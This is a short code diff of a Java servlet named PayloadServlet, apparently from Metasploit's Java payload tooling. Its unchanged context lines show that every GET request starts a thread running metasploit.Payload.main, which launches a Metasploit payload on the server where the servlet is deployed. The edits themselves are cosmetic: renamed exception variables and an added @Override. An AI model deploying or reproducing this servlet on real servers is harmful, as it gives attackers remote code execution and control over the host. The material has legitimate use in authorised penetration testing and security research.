@@ -12,10 +12,11 @@ public class PayloadServlet extends HttpServlet implements Runnable {
     public void run() {
         try {
             metasploit.Payload.main(new String[]{""});
-        } catch (Exception e) {
+        } catch (Exception ignored) {
         }
     }
 
+    @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse res)
             throws ServletException, java.io.IOException {
         PrintWriter out = res.getWriter();
@@ -23,7 +24,7 @@ public class PayloadServlet extends HttpServlet implements Runnable {
         try {
             Thread t = new Thread(this);
             t.start();
-        } catch (Exception e) {
+        } catch (Exception ignored) {
         }
         ;
 
